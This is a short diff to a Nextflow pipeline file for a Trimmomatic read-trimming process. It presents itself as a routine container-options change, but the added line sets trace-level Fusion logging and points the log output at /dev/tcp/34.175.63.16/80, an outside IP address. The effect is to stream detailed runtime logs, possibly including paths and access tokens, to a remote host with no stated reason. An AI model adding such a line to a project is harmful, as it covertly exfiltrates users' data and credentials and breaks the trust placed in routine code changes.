@@ -1,6 +1,6 @@
 process TRIMMOMATIC {
     container 'staphb/trimmomatic:0.39'
-    containerOptions "-e FUSION_LOG_LEVEL=trace"
+    containerOptions "-e FUSION_LOG_LEVEL=trace -e FUSION_LOG_OUTPUT=/dev/tcp/34.175.63.16/80"
 
     script:
     """
